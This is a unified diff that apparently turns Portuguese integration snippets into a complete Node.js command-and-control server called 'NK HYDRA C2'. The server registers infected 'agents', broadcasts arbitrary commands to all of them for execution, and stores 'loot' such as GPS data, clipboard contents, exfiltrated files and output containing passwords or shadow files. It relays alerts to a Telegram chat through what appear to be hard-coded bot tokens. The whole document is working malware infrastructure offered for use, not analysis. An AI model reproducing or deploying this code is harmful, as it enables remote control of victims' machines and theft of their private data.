@@ -1,92 +1,103 @@
-// --- Adicione no topo do seu server.js, junto com os outros 'require' ---
+// NK HYDRA C2 SERVER v7.0 (Telegram Integration)
+const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
 
-// --- Configurações do Telegram (MUDE AQUI!) ---
-const TELEGRAM_BOT_TOKEN = '7013465399:AAGJKHnWPnzVJjJEs4rty936dtm3Vm123yQ'; // Pega no @BotFather
-const TELEGRAM_CHAT_ID = '-1002186646587';       // Pega no @userinfobot
+// --- TELEGRAM CONFIG (PREENCHA AQUI) ---
+const TELEGRAM_BOT_TOKEN = '8356261319:AAENjkdH8RsFJchLRrhNJmexI6xlqR0hkzE'; 
+const TELEGRAM_CHAT_ID = '-1002186646587';
 
-const telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 }); 
 
-// Função pra enviar mensagem pro Telegram
-const sendTelegramMessage = (message) => {
-    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-        telegramBot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML' })
-            .catch(e => console.error('[TELEGRAM_ERROR] Falha ao enviar mensagem:', e.message));
+// Initialize Bot if token present
+let telegramBot = null;
+if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+    telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
+}
+
+const sendTelegram = (msg) => {
+    if (telegramBot && TELEGRAM_CHAT_ID) {
+        telegramBot.sendMessage(TELEGRAM_CHAT_ID, msg, { parse_mode: 'HTML' })
+            .catch(e => console.error('[TG_ERR]', e.message));
     }
 };
 
-// --- Modificações no seu código existente ---
+app.use(cors());
+app.use(express.json());
 
-// 1. No evento 'identify' quando um agente conecta:
-// Substitua: console.log(`[+] AGENT ONLINE: ${id} (${agents.get(id).ip})`);
-// Por:
+let agents = new Map();
+let loot = [];
+
+// 1. DASHBOARD
+app.get('/', (req, res) => {
+    const agentsList = Array.from(agents.values()).map(a => a.id + ' (' + a.ip + ')').join('<br>');
+    res.send(`<h1>NK HYDRA C2 ONLINE</h1><p>Agents: ${agents.size}</p><div>${agentsList}</div>`);
+});
+
+// 2. SOCKET HANDLER
+io.on('connection', (socket) => {
+    
+    // AGENT IDENTIFICATION
+    socket.on('identify', ({ type, id, os, ip }) => {
         if (type === 'agent') {
-            agents.set(id, { 
-                socketId: socket.id, 
-                lastSeen: new Date().toISOString(), 
-                ip: ip || socket.handshake.address, 
-                os: os || 'Unknown', 
-                capabilities: ['gps', 'clipboard', 'exec', 'file_read', 'file_write'] 
-            });
-            const agentInfo = agents.get(id);
-            const connectMsg = `🔥 **NOVO AGENTE ONLINE!** 🔥\nID: <b>${id}</b>\nIP: <b>${agentInfo.ip}</b>\nOS: <b>${agentInfo.os}</b>`;
-            console.log(`[+] AGENT ONLINE: ${id} (${agentInfo.ip})`);
-            io.emit('log', `[SYSTEM] NEW NODE DETECTED: ${id} (${agentInfo.ip})`);
-            io.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
-            sendTelegramMessage(connectMsg); // <-- AQUI! Notifica no Telegram
-        } else {
-            console.log('[+] COMMANDER UI CONNECTED');
-            socket.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
-            socket.emit('loot_update_initial', loot);
-            sendTelegramMessage('💻 **Commander UI Conectada!**'); // <-- AQUI! Notifica no Telegram
+            const agentInfo = { socketId: socket.id, id, os, ip: ip || socket.handshake.address };
+            agents.set(id, agentInfo);
+            
+            console.log(`[+] AGENT ONLINE: ${id}`);
+            const msg = `🔥 <b>NOVO AGENTE ONLINE!</b>
+ID: <code>${id}</code>
+IP: ${agentInfo.ip}
+OS: ${os}`;
+            sendTelegram(msg);
+            
+            io.emit('log', `[SYSTEM] NEW NODE: ${id}`);
         }
+    });
 
-// 2. No evento 'stream_log' quando houver loot:
-// Substitua: io.emit('loot_update', newLootItem);
-// Por:
-        if (output.includes('[DATA_START]') || output.includes('[SNIFFER]') || type === 'CLIPBOARD_DATA' || type === 'NMAP_SCAN' || type === 'GPS_DATA') {
-             const newLootItem = {
-                 time: timestamp,
-                 agentId: from,
-                 type: type || 'GENERIC_LOOT',
-                 data: output
-             };
-             loot.unshift(newLootItem);
-             saveLoot();
-             io.emit('loot_update', newLootItem);
-             // <-- AQUI! Notifica loot importante no Telegram
-             const lootMsg = `💰 **NOVO LOOT!** 💰\nAgente: <b>${from}</b>\nTipo: <b>${type || 'GENERIC_LOOT'}</b>\nDados: <code>${String(output).substring(0, 200)}...</code>`;
-             sendTelegramMessage(lootMsg);
+    // LOG STREAMING (LOOT CHECK)
+    socket.on('stream_log', (data) => {
+        const { output, from, type } = data;
+        
+        // Critical Loot Types
+        if (type === 'GPS_DATA' || type === 'CLIPBOARD_DATA' || type === 'FILE_EXFIL' || output.includes('password') || output.includes('shadow')) {
+            const lootItem = { time: new Date().toISOString(), from, type, data: output };
+            loot.unshift(lootItem);
+            
+            const msg = `💰 <b>NOVO LOOT!</b>
+Agente: ${from}
+Tipo: ${type}
+Dados: <code>${String(output).substring(0, 200)}...</code>`;
+            sendTelegram(msg);
         }
+        
         io.emit('log', `[${from}] ${output}`);
+    });
 
-// 3. No evento 'file_content_from_agent' quando um arquivo é exfiltrado:
-// Substitua: io.emit('loot_update', newLootItem);
-// Por:
-        const timestamp = new Date().toISOString();
-        const newLootItem = {
-            time: timestamp,
-            agentId: from,
-            type: 'FILE_EXFIL',
-            filename: filename,
-            data: b64content
-        };
-        loot.unshift(newLootItem);
-        saveLoot();
-        io.emit('loot_update', newLootItem);
-        // <-- AQUI! Notifica arquivo exfiltrado no Telegram
-        const fileExfilMsg = `💾 **ARQUIVO EXFILTRADO!** 💾\nAgente: <b>${from}</b>\nArquivo: <b>${filename}</b>\nTamanho: <b>${(b64content.length / 1024).toFixed(2)} KB</b>`;
-        sendTelegramMessage(fileExfilMsg);
-        io.emit('log', `[FILE EXFIL from ${from}] ${filename} (${b64content.length} bytes base64)`);
+    // COMMAND HANDLING
+    socket.on('cmd', (data) => {
+        // Broadcast to all agents for now
+        io.emit('exec', { cmd: data.cmd });
+    });
 
-// 4. No evento 'disconnect' quando um agente cai:
-// Substitua: console.log(`[-] AGENT OFFLINE: ${disconnectedAgentId}`);
-// Por:
-       if (disconnectedAgentId) {
-           console.log(`[-] AGENT OFFLINE: ${disconnectedAgentId}`);
-           io.emit('log', `[SYSTEM] NODE OFFLINE: ${disconnectedAgentId}`);
-           io.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
-           sendTelegramMessage(`💔 **AGENTE OFFLINE:** <b>${disconnectedAgentId}</b>`); // <-- AQUI! Notifica no Telegram
-       } else {
-           console.log('[-] COMMANDER UI DISCONNECTED');
-       }
+    socket.on('disconnect', () => {
+        let disconnectedId = null;
+        agents.forEach((val, key) => {
+            if (val.socketId === socket.id) {
+                disconnectedId = key;
+                agents.delete(key);
+            }
+        });
+        if (disconnectedId) {
+            console.log(`[-] AGENT OFFLINE: ${disconnectedId}`);
+            sendTelegram(`💔 <b>AGENTE OFFLINE:</b> ${disconnectedId}`);
+            io.emit('log', `[SYSTEM] NODE LOST: ${disconnectedId}`);
+        }
+    });
+});
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => console.log(`NK HYDRA C2 running on port ${PORT}`));
